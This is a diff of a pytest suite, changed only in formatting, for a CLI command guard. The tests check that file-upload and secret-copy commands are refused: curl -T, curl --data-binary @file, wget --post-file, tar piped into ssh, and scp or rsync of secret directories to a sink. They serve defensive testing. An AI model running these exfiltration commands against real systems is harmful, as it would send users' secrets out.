@@ -139,15 +139,21 @@ def _write_secret(tmp_path: Path) -> tuple[Path, str]:
     return secret, marker
 
 
-requires_curl = pytest.mark.skipif(shutil.which("curl") is None, reason="curl not installed")
-requires_wget = pytest.mark.skipif(shutil.which("wget") is None, reason="wget not installed")
+requires_curl = pytest.mark.skipif(
+    shutil.which("curl") is None, reason="curl not installed"
+)
+requires_wget = pytest.mark.skipif(
+    shutil.which("wget") is None, reason="wget not installed"
+)
 
 
 # ── The defect: a local-file upload must not reach the collector ──────────────
 
 
 @requires_curl
-def test_curl_upload_reaches_no_collector(collector: _Collector, tmp_path: Path) -> None:
+def test_curl_upload_reaches_no_collector(
+    collector: _Collector, tmp_path: Path
+) -> None:
     """`curl -T <secret> <loopback collector>` is refused, nothing is delivered.
 
     Pre-fix this command came back `modify` (namespace wrap), the CLI ran the
@@ -171,7 +177,9 @@ def test_curl_upload_reaches_no_collector(collector: _Collector, tmp_path: Path)
 
 
 @requires_curl
-def test_curl_data_file_body_reaches_no_collector(collector: _Collector, tmp_path: Path) -> None:
+def test_curl_data_file_body_reaches_no_collector(
+    collector: _Collector, tmp_path: Path
+) -> None:
     """The `--data-binary @file` sibling is refused end-to-end too."""
     secret, marker = _write_secret(tmp_path)
 
@@ -187,7 +195,9 @@ def test_curl_data_file_body_reaches_no_collector(collector: _Collector, tmp_pat
 
 
 @requires_wget
-def test_wget_post_file_reaches_no_collector(collector: _Collector, tmp_path: Path) -> None:
+def test_wget_post_file_reaches_no_collector(
+    collector: _Collector, tmp_path: Path
+) -> None:
     """wget's file-body POST (`--post-file`) is refused end-to-end."""
     secret, marker = _write_secret(tmp_path)
 
@@ -211,7 +221,9 @@ def test_plain_download_still_executes_and_delivers(collector: _Collector) -> No
     satisfied by a harness that never runs anything at all.
     """
     if not _cli_can_execute_a_command():
-        pytest.skip("this host cannot launch commands through the CLI (degraded namespace)")
+        pytest.skip(
+            "this host cannot launch commands through the CLI (degraded namespace)"
+        )
 
     result = _run_cli("curl", "-sS", f"{collector.url}/health")
 
@@ -229,7 +241,9 @@ def test_plain_download_still_executes_and_delivers(collector: _Collector) -> No
 def test_inline_api_body_still_executes_and_delivers(collector: _Collector) -> None:
     """Control: an inline-body API POST (no local file) is not over-blocked."""
     if not _cli_can_execute_a_command():
-        pytest.skip("this host cannot launch commands through the CLI (degraded namespace)")
+        pytest.skip(
+            "this host cannot launch commands through the CLI (degraded namespace)"
+        )
 
     result = _run_cli(
         "curl", "-sS", "-X", "POST", "-d", '{"job":1}', f"{collector.url}/api/v1/job"
@@ -333,7 +347,9 @@ def tcp_collector():
         collector.close()
 
 
-def test_tar_over_ssh_reaches_no_sink(tcp_collector: _TcpCollector, tmp_path: Path) -> None:
+def test_tar_over_ssh_reaches_no_sink(
+    tcp_collector: _TcpCollector, tmp_path: Path
+) -> None:
     """`tar cf - <secret> | ssh <local sink> 'cat > /tmp/x'` delivers nothing.
 
     The defect: the reader-pipe-into-ssh transport was a plain ALLOW (and the
@@ -399,8 +415,7 @@ def test_tcp_collector_observes_a_real_delivery() -> None:
             threading.Event().wait(0.05)
             waited += 0.05
         assert collector.data == payload, (
-            f"the harness failed to observe a delivery it caused: "
-            f"{collector.data!r}"
+            f"the harness failed to observe a delivery it caused: {collector.data!r}"
         )
     finally:
         collector.close()
@@ -456,9 +471,7 @@ def test_scp_scoped_secret_tree_reaches_no_sink(source: str) -> None:
     Mirrors the whole-tree remote-copy shapes above with the sources the rule
     is really guarding: scoped secret directories, not a home-rooted tree.
     """
-    result = _run_cli(
-        "bash", "-c", f"scp -r {source} {_REMOTE_COPY_SINK}:/tmp/x"
-    )
+    result = _run_cli("bash", "-c", f"scp -r {source} {_REMOTE_COPY_SINK}:/tmp/x")
 
     assert result.returncode == 126, (
         f"the CLI did not refuse the scoped-source scp ({source}): "
@@ -471,9 +484,7 @@ def test_scp_scoped_secret_tree_reaches_no_sink(source: str) -> None:
 @pytest.mark.parametrize("source", _SCOPED_SECRET_SOURCES)
 def test_rsync_scoped_secret_tree_reaches_no_sink(source: str) -> None:
     """`rsync -a <scoped secret dir> remote:/x` is refused, nothing is copied."""
-    result = _run_cli(
-        "bash", "-c", f"rsync -a {source} {_REMOTE_COPY_SINK}:/tmp/x"
-    )
+    result = _run_cli("bash", "-c", f"rsync -a {source} {_REMOTE_COPY_SINK}:/tmp/x")
 
     assert result.returncode == 126, (
         f"the CLI did not refuse the scoped-source rsync ({source}): "
@@ -496,9 +507,7 @@ def test_tar_scoped_secret_over_ssh_reaches_no_sink(
     marker = f"DF31-SECRET-{uuid.uuid4().hex}"
     (tmp_path / "seed.txt").write_text(f"{marker}\n")
 
-    command = (
-        f"tar cf - {source} | ssh -p {tcp_collector.port} 127.0.0.1 'tar xf -'"
-    )
+    command = f"tar cf - {source} | ssh -p {tcp_collector.port} 127.0.0.1 'tar xf -'"
     result = _run_cli("bash", "-c", command)
 
     assert result.returncode == 126, (
@@ -522,7 +531,7 @@ _SCOPED_SOURCE_ENGINE_SHAPES = (
         "builtin-net-remote-tree-copy",
     ),
     (
-        'tar cf - {source} | ssh ' + _REMOTE_COPY_SINK + ' "tar xf -"',
+        "tar cf - {source} | ssh " + _REMOTE_COPY_SINK + ' "tar xf -"',
         "builtin-net-file-exfil-ssh",
     ),
 )
@@ -549,8 +558,7 @@ def test_engine_verdict_for_scoped_secret_sources(
         ),
     )
     assert result.action == "block", (
-        f"engine verdict for {command!r} is {result.action!r} "
-        f"(rule={result.rule_id!r})"
+        f"engine verdict for {command!r} is {result.action!r} (rule={result.rule_id!r})"
     )
     assert result.rule_id == expected_rule, (
         f"rule for {command!r} is {result.rule_id!r}, expected {expected_rule!r}"
